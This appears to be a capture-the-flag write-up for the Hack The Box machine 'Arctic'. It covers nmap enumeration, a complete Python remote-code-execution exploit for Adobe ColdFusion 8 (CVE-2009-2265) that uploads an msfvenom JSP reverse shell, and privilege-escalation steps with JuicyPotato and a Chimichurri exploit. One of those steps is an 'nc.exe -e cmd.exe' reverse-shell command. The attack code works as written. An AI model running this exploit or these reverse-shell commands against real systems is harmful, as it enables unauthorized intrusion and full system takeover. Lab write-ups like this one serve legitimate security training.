# Arctic
> Silver Garcia

## Enumeration
nmap
```bash
└──╼ [★]$ sudo nmap -T4 -A -p- 10.10.10.11
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-18 02:15 BST
Nmap scan report for 10.10.10.11
Host is up (0.070s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   75.25 ms 10.10.14.1
2   73.83 ms 10.10.10.11
```
Found ColdFusion administrator login portal on 10.10.10.11:8500/CFIDE/administrator/enter.cfm

## Getting access
Got access using CVE-2009-2265 exploit

Exploit:
```python
# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# Google Dork: intext:"adobe coldfusion 8"
# Date: 24/06/2021
# Exploit Author: Pergyz
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: 8
# Tested on: Microsoft Windows Server 2008 R2 Standard
# CVE : CVE-2009-2265

#!/usr/bin/python3

from multiprocessing import Process
import io
import mimetypes
import os
import urllib.request
import uuid

class MultiPartForm:

    def __init__(self):
        self.files = []
        self.boundary = uuid.uuid4().hex.encode('utf-8')
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()

        if mimetype is None:
            mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream')

        self.files.append((fieldname, filename, mimetype, body))
        return

    @staticmethod
    def _attached_file(name, filename):
        return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')

    @staticmethod
    def _content_type(ct):
        return 'Content-Type: {}\r\n'.format(ct).encode('utf-8')

    def __bytes__(self):
        buffer = io.BytesIO()
        boundary = b'--' + self.boundary + b'\r\n'

        for f_name, filename, f_content_type, body in self.files:
            buffer.write(boundary)
            buffer.write(self._attached_file(f_name, filename))
            buffer.write(self._content_type(f_content_type))
            buffer.write(b'\r\n')
            buffer.write(body)
            buffer.write(b'\r\n')

        buffer.write(b'--' + self.boundary + b'--\r\n')
        return buffer.getvalue()

def execute_payload():
    print('\nExecuting the payload...')
    print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8'))

def listen_connection():
    print('\nListening for connection...')
    os.system(f'nc -nlvp {lport}')

if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.5'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex

    # Generate a payload that connects back and spawns a command shell
    print("\nGenerating a payload...")
    os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')

    # Encode the form data
    form = MultiPartForm()
    form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.jsp', 'rb'))
    data = bytes(form)

    # Create a request
    request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00', data=data)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(data))

    # Print the request
    print('\nPriting request...')

    for name, value in request.header_items():
        print(f'{name}: {value}')

    print('\n' + request.data.decode('utf-8'))

    # Send the request and print the response
    print('\nSending request and printing response...')
    print(urllib.request.urlopen(request).read().decode('utf-8'))

    # Print some information
    print('\nPrinting some information for debugging...')
    print(f'lhost: {lhost}')
    print(f'lport: {lport}')
    print(f'rhost: {rhost}')
    print(f'rport: {rport}')
    print(f'payload: {filename}.jsp')

    # Delete the payload
    print("\nDeleting the payload...")
    os.system(f'rm {filename}.jsp')

    # Listen for connections and execute the payload
    p1 = Process(target=listen_connection)
    p1.start()
    p2 = Process(target=execute_payload)
    p2.start()
    p1.join()
    p2.join()
```

## Privilege escalation

JuicyPotato (Didn't work)
```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\tolis\nc.exe -e cmd.exe 10.10.14.5 5050" -t *
```

**Got system privileges using MS10-05 (Chimichurri exploit)**
1. First set listener:
```bash
nc -lvnp 5555
```
2. Execute exploit:
```cmd
chimichurri.exe 10.10.14.5 55555
```
